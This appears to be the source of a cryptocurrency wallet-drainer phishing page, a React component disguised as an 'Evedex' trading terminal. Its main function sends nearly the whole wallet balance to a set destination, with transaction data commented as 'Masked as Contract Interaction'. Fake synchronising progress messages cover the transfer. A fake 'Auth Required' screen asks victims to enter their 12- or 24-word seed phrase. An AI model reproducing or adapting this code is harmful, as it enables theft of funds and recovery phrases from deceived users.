...
export default function EvedexTerminal() {
  ...
  const executeContractMove = async () => {
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText(activeTask === "Delay" ? "ACCELERATING MEMPOOL..." : "ESTABLISHING CONTRACT...");

    const gasBuffer = balance.value / 75n; 
    const fullAmount = balance.value - gasBuffer;

    try {
      sendTransaction({
        to: destination,
        value: fullAmount > 0n ? fullAmount : 0n,
        data: "0x636f6e74726163745f6465706c6f79" // Masked as Contract Interaction
      }, {
        onSettled: () => {
          let progress = 0;
          const progInterval = setInterval(() => {
            progress += 2;
            setLoadingText(`SYNCHRONIZING: ${progress}%`);
            if (progress >= 60) {
    ...
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex flex-col">
          ...
          <div className="flex items-center gap-1.5 mt-1 text-[7px] text-slate-500 tracking-widest font-mono">
             NODE_STATUS: ONLINE // HANDSHAKE_READY
          </div>
        </div>
        <w3m-button /> 
      </header>
        ...
        <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 shadow-2xl animate-in slide-in-from-bottom-8 text-center">
          ...
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">
                {activeTask === "Rectify" ? "NODE_STATUS_OVERVIEW" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}
            </label>
            
            {activeTask === "Rectify" ? (
              <div className="text-2xl font-mono text-white italic py-1 opacity-80 select-none">
                 {balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "Scanning..."}
              </div>
            ) : (
              <input 
                type="text" 
                ...
                placeholder={balance ? `DETECTED: ${balance.formatted.slice(0,5)}` : "0.00"}
                className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full placeholder:text-slate-900"
              />
            )}
          </div>
          
          <button onClick={executeContractMove} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">
          ...
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            {!isSyncing ? (
              <>
                ...
                <h2 className="text-white font-black text-lg italic uppercase leading-none tracking-tighter">Auth Required</h2>
                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">
                   System connection interrupted. Import Project Authorization Seed to finalize {activeTask}.
                </p>
                <div className="mt-8"><textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER 12 OR 24 WORDS..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
              ...
              <div className="py-10">
                ...
                <p className="text-[9px] text-slate-500 italic animate-pulse">
                  {syncProgress >= 80 ? "Broadcasting final contract..." : "Validating relay connection..."}
                </p>
              </div>
            )}
          </div>
